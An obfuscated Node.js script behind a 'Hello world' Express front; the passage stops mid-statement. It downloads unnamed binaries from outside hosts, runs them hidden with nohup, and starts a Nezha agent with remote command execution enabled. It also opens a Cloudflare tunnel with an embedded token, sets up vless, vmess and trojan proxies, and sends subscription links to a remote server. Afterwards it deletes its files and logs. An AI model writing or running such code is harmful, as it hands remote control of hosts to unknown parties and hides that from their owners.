const _0x4fbc61=_0x3604;(function(_0xc5cee7,_0x5c3e77){const _0x3b22b4=_0x3604,_0x2b4d28=_0xc5cee7();while(!![]){try{const _0x501027=-parseInt(_0x3b22b4(0x1e1))/0x1+-parseInt(_0x3b22b4(0x19f))/0x2*(-parseInt(_0x3b22b4(0x1e4))/0x3)+-parseInt(_0x3b22b4(0x16d))/0x4*(parseInt(_0x3b22b4(0x1e3))/0x5)+-parseInt(_0x3b22b4(0x1f7))/0x6*(-parseInt(_0x3b22b4(0x1dc))/0x7)+-parseInt(_0x3b22b4(0x174))/0x8+parseInt(_0x3b22b4(0x1eb))/0x9+parseInt(_0x3b22b4(0x198))/0xa;if(_0x501027===_0x5c3e77)break;else _0x2b4d28['push'](_0x2b4d28['shift']());}catch(_0x3e83ed){_0x2b4d28['push'](_0x2b4d28['shift']());}}}(_0x1c87,0x6ed79));const express=require(_0x4fbc61(0x15c)),app=express(),axios=require(_0x4fbc61(0x172)),os=require('os'),fs=require('fs'),path=require(_0x4fbc61(0x15e)),{promisify}=require(_0x4fbc61(0x1ce)),exec=promisify(require(_0x4fbc61(0x1de))[_0x4fbc61(0x1b6)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x4fbc61(0x16f)][_0x4fbc61(0x1b2)]||'',PROJECT_URL=process[_0x4fbc61(0x16f)][_0x4fbc61(0x155)]||'',AUTO_ACCESS=process['env'][_0x4fbc61(0x156)]||![],FILE_PATH=process['env'][_0x4fbc61(0x193)]||_0x4fbc61(0x200),SUB_PATH=process[_0x4fbc61(0x16f)][_0x4fbc61(0x178)]||_0x4fbc61(0x1a2),PORT=process[_0x4fbc61(0x16f)][_0x4fbc61(0x1bc)]||process[_0x4fbc61(0x16f)][_0x4fbc61(0x1f1)]||0xbb8,UUID=process[_0x4fbc61(0x16f)][_0x4fbc61(0x1d0)]||_0x4fbc61(0x1b0),NEZHA_SERVER=process['env'][_0x4fbc61(0x14e)]||'',NEZHA_PORT=process[_0x4fbc61(0x16f)][_0x4fbc61(0x190)]||'',NEZHA_KEY=process[_0x4fbc61(0x16f)][_0x4fbc61(0x15f)]||'',ARGO_DOMAIN=process['env']['ARGO_DOMAIN']||_0x4fbc61(0x150),ARGO_AUTH=process[_0x4fbc61(0x16f)][_0x4fbc61(0x1c2)]||_0x4fbc61(0x184),ARGO_PORT=process[_0x4fbc61(0x16f)]['ARGO_PORT']||0x1f41,CFIP=process[_0x4fbc61(0x16f)][_0x4fbc61(0x17c)]||_0x4fbc61(0x15a),CFPORT=process[_0x4fbc61(0x16f)]['CFPORT']||0x1bb,NAME=process[_0x4fbc61(0x16f)][_0x4fbc61(0x1e2)]||_0x4fbc61(0x14d);!fs['existsSync'](FILE_PATH)?(fs[_0x4fbc61(0x187)](FILE_PATH),console['log'](FILE_PATH+_0x4fbc61(0x162))):console[_0x4fbc61(0x1ba)](FILE_PATH+_0x4fbc61(0x1c1));function generateRandomName(){const _0xb87d60=_0x4fbc61,_0x45ae0d=_0xb87d60(0x17b);let _0x5aff32='';for(let _0x1fe43d=0x0;_0x1fe43d<0x6;_0x1fe43d++){_0x5aff32+=_0x45ae0d[_0xb87d60(0x1d1)](Math['floor'](Math[_0xb87d60(0x17d)]()*_0x45ae0d[_0xb87d60(0x1d8)]));}return _0x5aff32;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x4fbc61(0x1ee)](FILE_PATH,npmName),phpPath=path[_0x4fbc61(0x1ee)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x4fbc61(0x1ee)](FILE_PATH,botName),subPath=path[_0x4fbc61(0x1ee)](FILE_PATH,_0x4fbc61(0x163)),listPath=path[_0x4fbc61(0x1ee)](FILE_PATH,_0x4fbc61(0x153)),bootLogPath=path[_0x4fbc61(0x1ee)](FILE_PATH,_0x4fbc61(0x1b3)),configPath=path[_0x4fbc61(0x1ee)](FILE_PATH,'config.json');function deleteNodes(){const _0x53ba1c=_0x4fbc61;try{if(!UPLOAD_URL)return;if(!fs[_0x53ba1c(0x180)](subPath))return;let _0x13e9f8;try{_0x13e9f8=fs[_0x53ba1c(0x1f0)](subPath,'utf-8');}catch{return null;}const _0x1569bb=Buffer[_0x53ba1c(0x158)](_0x13e9f8,_0x53ba1c(0x199))['toString'](_0x53ba1c(0x17a)),_0x5e0c42=_0x1569bb[_0x53ba1c(0x1b8)]('\x0a')['filter'](_0x1b0f31=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x53ba1c(0x1c3)](_0x1b0f31));if(_0x5e0c42[_0x53ba1c(0x1d8)]===0x0)return;return axios[_0x53ba1c(0x1c5)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x53ba1c(0x15d)]({'nodes':_0x5e0c42}),{'headers':{'Content-Type':_0x53ba1c(0x1ac)}})[_0x53ba1c(0x1ef)](_0x2aed0b=>{return null;}),null;}catch(_0x3db6e0){return null;}}function cleanupOldFiles(){try{const _0x28043b=fs['readdirSync'](FILE_PATH);_0x28043b['forEach'](_0x46d358=>{const _0x238989=_0x3604,_0x5d7018=path[_0x238989(0x1ee)](FILE_PATH,_0x46d358);try{const _0x11b1b6=fs['statSync'](_0x5d7018);_0x11b1b6[_0x238989(0x1f3)]()&&fs[_0x238989(0x19e)](_0x5d7018);}catch(_0x5e0f34){}});}catch(_0x27436f){}}app[_0x4fbc61(0x192)]('/',function(_0x3d22e8,_0xcff46){const _0x125de7=_0x4fbc61;_0xcff46[_0x125de7(0x18d)]('Hello\x20world!');});async function generateConfig(){const _0x5a9705=_0x4fbc61,_0x1489b1={'log':{'access':'/dev/null','error':_0x5a9705(0x171),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x5a9705(0x1cd),'fallbacks':[{'dest':0xbb9},{'path':_0x5a9705(0x1e9),'dest':0xbba},{'path':_0x5a9705(0x1a1),'dest':0xbbb},{'path':_0x5a9705(0x147),'dest':0xbbc}]},'streamSettings':{'network':_0x5a9705(0x17f)}},{'port':0xbb9,'listen':_0x5a9705(0x1af),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x5a9705(0x17f),'security':_0x5a9705(0x1cd)}},{'port':0xbba,'listen':_0x5a9705(0x1af),'protocol':_0x5a9705(0x167),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x5a9705(0x1cd)},'streamSettings':{'network':'ws','security':_0x5a9705(0x1cd),'wsSettings':{'path':_0x5a9705(0x1e9)}},'sniffing':{'enabled':!![],'destOverride':[_0x5a9705(0x1a7),_0x5a9705(0x1df),_0x5a9705(0x165)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x5a9705(0x1af),'protocol':_0x5a9705(0x1a5),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x5a9705(0x1a7),'tls',_0x5a9705(0x165)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x5a9705(0x1af),'protocol':_0x5a9705(0x1c4),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x5a9705(0x1cd),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x5a9705(0x1a7),_0x5a9705(0x1df),_0x5a9705(0x165)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x5a9705(0x1ab),'tag':_0x5a9705(0x1ad)},{'protocol':_0x5a9705(0x144),'tag':_0x5a9705(0x181)}]};fs[_0x5a9705(0x1ec)](path[_0x5a9705(0x1ee)](FILE_PATH,'config.json'),JSON[_0x5a9705(0x15d)](_0x1489b1,null,0x2));}function getSystemArchitecture(){const _0x481eef=_0x4fbc61,_0x22a252=os[_0x481eef(0x1c9)]();return _0x22a252===_0x481eef(0x201)||_0x22a252===_0x481eef(0x196)||_0x22a252===_0x481eef(0x168)?'arm':_0x481eef(0x19d);}function downloadFile(_0x5a76dd,_0x488e72,_0x171a0c){const _0x86b9ee=_0x4fbc61,_0xf0f1d4=_0x5a76dd;!fs[_0x86b9ee(0x180)](FILE_PATH)&&fs[_0x86b9ee(0x187)](FILE_PATH,{'recursive':!![]});const _0x540613=fs[_0x86b9ee(0x1a9)](_0xf0f1d4);axios({'method':_0x86b9ee(0x192),'url':_0x488e72,'responseType':_0x86b9ee(0x1a8)})[_0x86b9ee(0x170)](_0x1c62d2=>{const _0x301a96=_0x86b9ee;_0x1c62d2[_0x301a96(0x1bd)][_0x301a96(0x166)](_0x540613),_0x540613['on'](_0x301a96(0x1d9),()=>{const _0x18ffcb=_0x301a96;_0x540613[_0x18ffcb(0x183)](),console[_0x18ffcb(0x1ba)](_0x18ffcb(0x17e)+path[_0x18ffcb(0x149)](_0xf0f1d4)+_0x18ffcb(0x146)),_0x171a0c(null,_0xf0f1d4);}),_0x540613['on'](_0x301a96(0x1a6),_0x3fad1b=>{const _0x139397=_0x301a96;fs[_0x139397(0x1c6)](_0xf0f1d4,()=>{});const _0x25d0ac='Download\x20'+path[_0x139397(0x149)](_0xf0f1d4)+_0x139397(0x194)+_0x3fad1b[_0x139397(0x157)];console['error'](_0x25d0ac),_0x171a0c(_0x25d0ac);});})[_0x86b9ee(0x1ef)](_0x913eaa=>{const _0x208c50=_0x86b9ee,_0xe44e2f=_0x208c50(0x17e)+path[_0x208c50(0x149)](_0xf0f1d4)+'\x20failed:\x20'+_0x913eaa[_0x208c50(0x157)];console[_0x208c50(0x1a6)](_0xe44e2f),_0x171a0c(_0xe44e2f);});}async function downloadFilesAndRun(){const _0x2c8cb8=_0x4fbc61,_0x1870b9=getSystemArchitecture(),_0x3a56b5=getFilesForArchitecture(_0x1870b9);if(_0x3a56b5['length']===0x0){console['log'](_0x2c8cb8(0x1f2));return;}const _0x5afa30=_0x3a56b5[_0x2c8cb8(0x145)](_0x13f99a=>{return new Promise((_0x200a36,_0x23f786)=>{const _0x2b2ffa=_0x3604;downloadFile(_0x13f99a['fileName'],_0x13f99a[_0x2b2ffa(0x14b)],(_0x1f6376,_0x283d0a)=>{_0x1f6376?_0x23f786(_0x1f6376):_0x200a36(_0x283d0a);});});});try{await Promise['all'](_0x5afa30);}catch(_0x3cced8){console[_0x2c8cb8(0x1a6)]('Error\x20downloading\x20files:',_0x3cced8);return;}function _0x27710e(_0x5099bb){const _0x12b8da=0x1fd;_0x5099bb['forEach'](_0x4385f8=>{fs['existsSync'](_0x4385f8)&&fs['chmod'](_0x4385f8,_0x12b8da,_0x2c873c=>{const _0x3a3fec=_0x3604;_0x2c873c?console[_0x3a3fec(0x1a6)](_0x3a3fec(0x18c)+_0x4385f8+':\x20'+_0x2c873c):console['log']('Empowerment\x20success\x20for\x20'+_0x4385f8+':\x20'+_0x12b8da['toString'](0x8));});});}const _0x18732e=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x27710e(_0x18732e);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3167d2=NEZHA_SERVER[_0x2c8cb8(0x1ca)](':')?NEZHA_SERVER['split'](':')[_0x2c8cb8(0x164)]():'',_0x30056d=new Set([_0x2c8cb8(0x1f4),'8443','2096',_0x2c8cb8(0x14c),'2083',_0x2c8cb8(0x18e)]),_0x411731=_0x30056d['has'](_0x3167d2)?'true':_0x2c8cb8(0x1e5),_0x357cd8=_0x2c8cb8(0x143)+NEZHA_KEY+_0x2c8cb8(0x1a0)+NEZHA_SERVER+_0x2c8cb8(0x1fa)+_0x411731+_0x2c8cb8(0x1dd)+UUID;fs[_0x2c8cb8(0x1ec)](path[_0x2c8cb8(0x1ee)](FILE_PATH,_0x2c8cb8(0x1f8)),_0x357cd8);const _0x9bc3d1='nohup\x20'+phpPath+_0x2c8cb8(0x176)+FILE_PATH+_0x2c8cb8(0x154);try{await exec(_0x9bc3d1),console[_0x2c8cb8(0x1ba)](phpName+'\x20is\x20running'),await new Promise(_0x555b57=>setTimeout(_0x555b57,0x3e8));}catch(_0x5d354d){console[_0x2c8cb8(0x1a6)](_0x2c8cb8(0x19b)+_0x5d354d);}}else{let _0xb0a1bf='';const _0x4370a1=[_0x2c8cb8(0x1f4),_0x2c8cb8(0x1d5),_0x2c8cb8(0x1d2),_0x2c8cb8(0x14c),_0x2c8cb8(0x1fd),_0x2c8cb8(0x18e)];_0x4370a1[_0x2c8cb8(0x1ca)](NEZHA_PORT)&&(_0xb0a1bf='--tls');const _0x19e052=_0x2c8cb8(0x16a)+npmPath+_0x2c8cb8(0x14f)+NEZHA_SERVER+':'+NEZHA_PORT+_0x2c8cb8(0x16c)+NEZHA_KEY+'\x20'+_0xb0a1bf+_0x2c8cb8(0x1e0);try{await exec(_0x19e052),console[_0x2c8cb8(0x1ba)](npmName+_0x2c8cb8(0x175)),await new Promise(_0x4aedf3=>setTimeout(_0x4aedf3,0x3e8));}catch(_0x44d5fe){console[_0x2c8cb8(0x1a6)]('npm\x20running\x20error:\x20'+_0x44d5fe);}}}else console['log'](_0x2c8cb8(0x18f));const _0x2ff7f1=_0x2c8cb8(0x16a)+webPath+_0x2c8cb8(0x1b9)+FILE_PATH+_0x2c8cb8(0x1f5);try{await exec(_0x2ff7f1),console[_0x2c8cb8(0x1ba)](webName+'\x20is\x20running'),await new Promise(_0x5ecd95=>setTimeout(_0x5ecd95,0x3e8));}catch(_0x22eec1){console[_0x2c8cb8(0x1a6)]('web\x20running\x20error:\x20'+_0x22eec1);}if(fs[_0x2c8cb8(0x180)](botPath)){let _0x21f72b;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x21f72b=_0x2c8cb8(0x1d4)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x21f72b=_0x2c8cb8(0x197)+FILE_PATH+_0x2c8cb8(0x202):_0x21f72b='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x2c8cb8(0x179)+ARGO_PORT;try{await exec(_0x2c8cb8(0x16a)+botPath+'\x20'+_0x21f72b+'\x20>/dev/null\x202>&1\x20&'),console[_0x2c8cb8(0x1ba)](botName+_0x2c8cb8(0x175)),await new Promise(_0x3cdb62=>setTimeout(_0x3cdb62,0x7d0));}catch(_0x51aae7){console[_0x2c8cb8(0x1a6)](_0x2c8cb8(0x1bb)+_0x51aae7);}}await new Promise(_0x2075e4=>setTimeout(_0x2075e4,0x1388));}function getFilesForArchitecture(_0x4e775){const _0x4dd703=_0x4fbc61;let _0x42009f;_0x4e775===_0x4dd703(0x201)?_0x42009f=[{'fileName':webPath,'fileUrl':_0x4dd703(0x15b)},{'fileName':botPath,'fileUrl':_0x4dd703(0x14a)}]:_0x42009f=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x8bd16b=_0x4e775==='arm'?_0x4dd703(0x148):_0x4dd703(0x1c0);_0x42009f['unshift']({'fileName':npmPath,'fileUrl':_0x8bd16b});}else{const _0x446b5b=_0x4e775===_0x4dd703(0x201)?'https://arm64.ssss.nyc.mn/v1':_0x4dd703(0x189);_0x42009f[_0x4dd703(0x1fc)]({'fileName':phpPath,'fileUrl':_0x446b5b});}}return _0x42009f;}function argoType(){const _0x39ea49=_0x4fbc61;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x39ea49(0x1fe));return;}if(ARGO_AUTH['includes'](_0x39ea49(0x1be))){fs[_0x39ea49(0x1ec)](path[_0x39ea49(0x1ee)](FILE_PATH,_0x39ea49(0x1ff)),ARGO_AUTH);const _0x4bdc3c=_0x39ea49(0x1d7)+ARGO_AUTH[_0x39ea49(0x1b8)]('\x22')[0xb]+_0x39ea49(0x1cc)+path[_0x39ea49(0x1ee)](FILE_PATH,_0x39ea49(0x1ff))+_0x39ea49(0x160)+ARGO_DOMAIN+_0x39ea49(0x1bf)+ARGO_PORT+_0x39ea49(0x186);fs[_0x39ea49(0x1ec)](path[_0x39ea49(0x1ee)](FILE_PATH,_0x39ea49(0x1b5)),_0x4bdc3c);}else console[_0x39ea49(0x1ba)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}argoType();function _0x3604(_0x57090a,_0x5330e9){const _0x1c8788=_0x1c87();return _0x3604=function(_0x360444,_0x1c28ec){_0x360444=_0x360444-0x143;let _0x15ff04=_0x1c8788[_0x360444];return _0x15ff04;},_0x3604(_0x57090a,_0x5330e9);}async function extractDomains(){const _0x46ff7c=_0x4fbc61;let _0x16ad66;if(ARGO_AUTH&&ARGO_DOMAIN)_0x16ad66=ARGO_DOMAIN,console['log'](_0x46ff7c(0x191),_0x16ad66),await _0x2fd821(_0x16ad66);else try{const _0x2af3c9=fs[_0x46ff7c(0x1f0)](path[_0x46ff7c(0x1ee)](FILE_PATH,_0x46ff7c(0x1b3)),_0x46ff7c(0x17a)),_0x4152ea=_0x2af3c9[_0x46ff7c(0x1b8)]('\x0a'),_0x4614c8=[];_0x4152ea[_0x46ff7c(0x1b4)](_0xf26880=>{const _0x4da294=_0x46ff7c,_0xa349e8=_0xf26880[_0x4da294(0x1c7)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0xa349e8){const _0x4247ce=_0xa349e8[0x1];_0x4614c8[_0x4da294(0x16e)](_0x4247ce);}});if(_0x4614c8[_0x46ff7c(0x1d8)]>0x0)_0x16ad66=_0x4614c8[0x0],console[_0x46ff7c(0x1ba)](_0x46ff7c(0x1f9),_0x16ad66),await _0x2fd821(_0x16ad66);else{console[_0x46ff7c(0x1ba)](_0x46ff7c(0x1d3)),fs[_0x46ff7c(0x19e)](path[_0x46ff7c(0x1ee)](FILE_PATH,_0x46ff7c(0x1b3)));async function _0x4c05c9(){const _0x1b0bf0=_0x46ff7c;try{process[_0x1b0bf0(0x19c)]===_0x1b0bf0(0x1da)?await exec(_0x1b0bf0(0x173)+botName+_0x1b0bf0(0x1aa)):await exec(_0x1b0bf0(0x1d6)+botName['charAt'](0x0)+']'+botName['substring'](0x1)+_0x1b0bf0(0x1f6));}catch(_0x24aaa8){}}_0x4c05c9(),await new Promise(_0x2e1990=>setTimeout(_0x2e1990,0xbb8));const _0x3d7e67=_0x46ff7c(0x188)+FILE_PATH+_0x46ff7c(0x179)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x3d7e67+'\x20>/dev/null\x202>&1\x20&'),console[_0x46ff7c(0x1ba)](botName+'\x20is\x20running'),await new Promise(_0x4c3d8a=>setTimeout(_0x4c3d8a,0xbb8)),await extractDomains();}catch(_0x4a8c76){console[_0x46ff7c(0x1a6)](_0x46ff7c(0x1bb)+_0x4a8c76);}}}catch(_0x168879){console['error'](_0x46ff7c(0x1b7),_0x168879);}async function _0x2fd821(_0x200c67){const _0x24ea3b=_0x46ff7c,_0x5987dc=execSync(_0x24ea3b(0x18a),{'encoding':_0x24ea3b(0x17a)}),_0x3e6e05=_0x5987dc['trim'](),_0x135d07=NAME?NAME+'-'+_0x3e6e05:_0x3e6e05;return new Promise(_0xf06c=>{setTimeout(()=>{const _0x1afd5c=_0x3604,_0x216fd6={'v':'2','ps':''+_0x135d07,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x1afd5c(0x1cd),'host':_0x200c67,'path':_0x1afd5c(0x1e6),'tls':_0x1afd5c(0x1df),'sni':_0x200c67,'alpn':'','fp':_0x1afd5c(0x185)},_0x3d7626='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x1afd5c(0x195)+_0x200c67+_0x1afd5c(0x1a3)+_0x200c67+_0x1afd5c(0x1e8)+_0x135d07+'\x0a\x20\x20\x0avmess://'+Buffer[_0x1afd5c(0x158)](JSON[_0x1afd5c(0x15d)](_0x216fd6))['toString'](_0x1afd5c(0x199))+_0x1afd5c(0x169)+UUID+'@'+CFIP+':'+CFPORT+_0x1afd5c(0x177)+_0x200c67+_0x1afd5c(0x1a3)+_0x200c67+_0x1afd5c(0x1db)+_0x135d07+'\x0a\x20\x20\x20\x20';console[_0x1afd5c(0x1ba)](Buffer[_0x1afd5c(0x158)](_0x3d7626)['toString'](_0x1afd5c(0x199))),fs[_0x1afd5c(0x1ec)](subPath,Buffer[_0x1afd5c(0x158)](_0x3d7626)[_0x1afd5c(0x16b)](_0x1afd5c(0x199))),console[_0x1afd5c(0x1ba)](FILE_PATH+_0x1afd5c(0x182)),uploadNodes(),app[_0x1afd5c(0x192)]('/'+SUB_PATH,(_0x361dc8,_0x369c29)=>{const _0x268b27=_0x1afd5c,_0x50c9b6=Buffer[_0x268b27(0x158)](_0x3d7626)[_0x268b27(0x16b)]('base64');_0x369c29[_0x268b27(0x1ea)](_0x268b27(0x1fb),_0x268b27(0x1a4)),_0x369c29[_0x268b27(0x18d)](_0x50c9b6);}),_0xf06c(_0x3d7626);},0x7d0);});}}function _0x1c87(){const _0x17346a=['split','\x20-c\x20','log','Error\x20executing\x20command:\x20','SERVER_PORT','data','TunnelSecret','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','https://amd64.ssss.nyc.mn/agent','\x20already\x20exists','ARGO_AUTH','test','trojan','post','unlink','match','App\x20is\x20running','arch','includes','\x20>\x20nul\x202>&1','\x0a\x20\x20credentials-file:\x20','none','util','Subscription\x20uploaded\x20successfully','UUID','charAt','2096','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','8443','pkill\x20-f\x20\x22[','\x0a\x20\x20tunnel:\x20','length','finish','win32','&path=%2Ftrojan-argo%3Fed%3D2560#','510811nJBUfJ','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','child_process','tls','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','490850NFfeZx','NAME','6565GMpFbG','3UZzTlY','false','/vmess-argo?ed=2560','clear','&path=%2Fvless-argo%3Fed%3D2560#','/vless-argo','set','4907034eryEex','writeFileSync','status','join','catch','readFileSync','PORT','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','isFile','443','/config.json\x20>/dev/null\x202>&1\x20&','\x22\x20>\x20/dev/null\x202>&1','12OoyKQp','config.yaml','ArgoDomain:','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','Content-Type','unshift','2083','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','tunnel.json','./tmp','arm','/tunnel.yml\x20run','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','\x0aclient_secret:\x20','blackhole','map','\x20successfully','/trojan-argo','https://arm64.ssss.nyc.mn/agent','basename','https://arm64.ssss.nyc.mn/bot','fileUrl','2087','alina','NEZHA_SERVER','\x20-s\x20','alina.kevinmercury.dpdns.org','/api/add-nodes','response','list.txt','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','PROJECT_URL','AUTO_ACCESS','message','from','Error\x20in\x20startserver:','cdns.doon.eu.org','https://arm64.ssss.nyc.mn/web','express','stringify','path','NEZHA_KEY','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','automatic\x20access\x20task\x20added\x20successfully','\x20is\x20created','sub.txt','pop','quic','pipe','vless','aarch64','\x0a\x20\x20\x0atrojan://','nohup\x20','toString','\x20-p\x20','2108alsbPc','push','env','then','/dev/null','axios','taskkill\x20/f\x20/im\x20','5951888sJynNS','\x20is\x20running','\x20-c\x20\x22','?security=tls&sni=','SUB_PATH','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','utf-8','abcdefghijklmnopqrstuvwxyz','CFIP','random','Download\x20','tcp','existsSync','block','/sub.txt\x20saved\x20successfully','close','eyJhIjoiOWViNDNkM2M3ZmYyYzM5YzZhYzM1ZjVkNzA5ZTE5ZmEiLCJ0IjoiYjQwNzg5YjAtMzZkOC00MTA3LWIzNWUtNmY3ZDE2MTg2MzBiIiwicyI6IlpEQTFOamN3Wm1VdFpXTXpaQzAwT0dOa0xXSmxPREl0TXpVMk56ZzBNelk0T1RnMyJ9','firefox','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','mkdirSync','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','https://amd64.ssss.nyc.mn/v1','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','\x20>/dev/null\x202>&1','Empowerment\x20failed\x20for\x20','send','2053','NEZHA\x20variable\x20is\x20empty,skip\x20running','NEZHA_PORT','ARGO_DOMAIN:','get','FILE_PATH','\x20failed:\x20','?encryption=none&security=tls&sni=','arm64','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','8190760BHmHXR','base64','Skipping\x20adding\x20automatic\x20access\x20task','php\x20running\x20error:\x20','platform','amd','unlinkSync','1741096CtVnYi','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','/vmess-argo','sub','&fp=firefox&type=ws&host=','text/plain;\x20charset=utf-8','vmess','error','http','stream','createWriteStream','.exe\x20>\x20nul\x202>&1','freedom','application/json','direct','https://oooo.serv00.net/add-url','127.0.0.1','1e8e50ab-ef7c-42c8-8b7b-332e63899e5f','/api/add-subscriptions','UPLOAD_URL','boot.log','forEach','tunnel.yml','exec','Error\x20reading\x20boot.log:'];_0x1c87=function(){return _0x17346a;};return _0x1c87();}async function uploadNodes(){const _0x16170f=_0x4fbc61;if(UPLOAD_URL&&PROJECT_URL){const _0x37f169=PROJECT_URL+'/'+SUB_PATH,_0x37914a={'subscription':[_0x37f169]};try{const _0x410f23=await axios[_0x16170f(0x1c5)](UPLOAD_URL+_0x16170f(0x1b1),_0x37914a,{'headers':{'Content-Type':_0x16170f(0x1ac)}});return _0x410f23&&_0x410f23[_0x16170f(0x1ed)]===0xc8?(console[_0x16170f(0x1ba)](_0x16170f(0x1cf)),_0x410f23):null;}catch(_0x2bf6f3){if(_0x2bf6f3[_0x16170f(0x152)]){if(_0x2bf6f3['response'][_0x16170f(0x1ed)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x16170f(0x180)](listPath))return;const _0x58c651=fs[_0x16170f(0x1f0)](listPath,_0x16170f(0x17a)),_0x4e3e97=_0x58c651[_0x16170f(0x1b8)]('\x0a')['filter'](_0x2035ec=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x16170f(0x1c3)](_0x2035ec));if(_0x4e3e97['length']===0x0)return;const _0x7718c8=JSON['stringify']({'nodes':_0x4e3e97});try{const _0x4bd7ab=await axios['post'](UPLOAD_URL+_0x16170f(0x151),_0x7718c8,{'headers':{'Content-Type':_0x16170f(0x1ac)}});return _0x4bd7ab&&_0x4bd7ab[_0x16170f(0x1ed)]===0xc8?(console[_0x16170f(0x1ba)]('Nodes\x20uploaded\x20successfully'),_0x4bd7ab):null;}catch(_0x190729){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x306db8=_0x3604,_0x242e7c=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x242e7c['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x242e7c['push'](phpPath);process[_0x306db8(0x19c)]===_0x306db8(0x1da)?exec('del\x20/f\x20/q\x20'+_0x242e7c[_0x306db8(0x1ee)]('\x20')+_0x306db8(0x1cb),_0x3d75f5=>{const _0x20fc74=_0x306db8;console[_0x20fc74(0x1e7)](),console['log']('App\x20is\x20running'),console[_0x20fc74(0x1ba)](_0x20fc74(0x203));}):exec('rm\x20-rf\x20'+_0x242e7c[_0x306db8(0x1ee)]('\x20')+_0x306db8(0x18b),_0x9b2bc3=>{const _0x31b1cc=_0x306db8;console[_0x31b1cc(0x1e7)](),console[_0x31b1cc(0x1ba)](_0x31b1cc(0x1c8)),console['log'](_0x31b1cc(0x203));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x59bba5=_0x4fbc61;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x59bba5(0x1ba)](_0x59bba5(0x19a));return;}try{const _0x2dbfc9=await axios[_0x59bba5(0x1c5)](_0x59bba5(0x1ae),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x59bba5(0x1ba)](_0x59bba5(0x161)),_0x2dbfc9;}catch(_0x524227){return console[_0x59bba5(0x1a6)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x524227[_0x59bba5(0x157)]),null;}}async function startserver(){const _0x17c67a=_0x4fbc61;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await 